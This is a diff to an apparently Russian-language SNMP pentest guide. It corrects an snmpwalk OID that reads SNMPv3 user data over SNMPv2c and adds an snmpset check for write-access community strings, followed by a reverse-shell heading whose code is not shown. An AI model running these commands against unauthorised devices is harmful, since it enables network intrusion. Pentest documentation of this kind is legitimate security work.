@@ -124,7 +124,7 @@ snmpwalk -v 2c -c <community> <target-ip> .1 | grep -i "trap"
 Даже если используется SNMPv3, через SNMPv2c можно вычитать информацию о пользователях SNMPv3:
 
 ```bash
-snmpwalk -v 2c -c <community> <target-ip> .1.3.6.1.6.3.15.1.2.2.1.3
+snmpwalk -v 2c -c <community> <target-ip> 1.3.6.1.6.3.15.1.2.2.1.3
 ```
 
 
@@ -181,6 +181,14 @@ bundle install
 
 ### Если есть RW-community — вы можете выполнять команды
 
+#### Проверка на наличие RW-прав
+```bash 
+snmpset -v2c -c community-string ip 1.3.6.1.2.1.1.5.0 s "test"
+```
+успешный ответ:
+```bash
+iso.3.6.1.2.1.1.5.0 = STRING: "test"
+```
 #### Linux — Reverse Shell через SNMP
 
 ```bash
